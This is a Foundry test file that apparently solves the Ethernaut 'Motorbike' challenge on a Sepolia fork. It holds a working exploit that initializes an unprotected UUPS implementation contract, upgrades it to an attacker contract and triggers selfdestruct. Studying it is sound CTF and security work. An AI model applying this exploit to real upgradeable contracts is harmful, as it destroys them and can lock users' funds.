// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface Motorbike{
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attacker {
    address owner;
    constructor(){
        owner = msg.sender;
    }
    function attack() public {
        address impl = 0x1a5D761CAad5A7048D2AEbEcf43f157CA52Dad29;
        Motorbike(impl).initialize();
        Motorbike(impl).upgradeToAndCall(address(this), abi.encodeWithSignature("killit()"));
    }

    function killit() public{
        selfdestruct(payable(owner));
    }
}

contract PuzzleWalletTest is Test {
    function setUp() public {
        vm.createSelectFork("sepolia", 5462397);
    }

    function test_motorbike() public {
        Motorbike motorbike = Motorbike(0xFF0c4881ddFA0e8167B8533a3E10DA5AD4aeebc0);
        Attacker attacker =  new Attacker();
        attacker.attack();
        // This stops working from Cancun upgrade
        // vm.expectRevert();
        // motorbike.upgrader();
    }
}
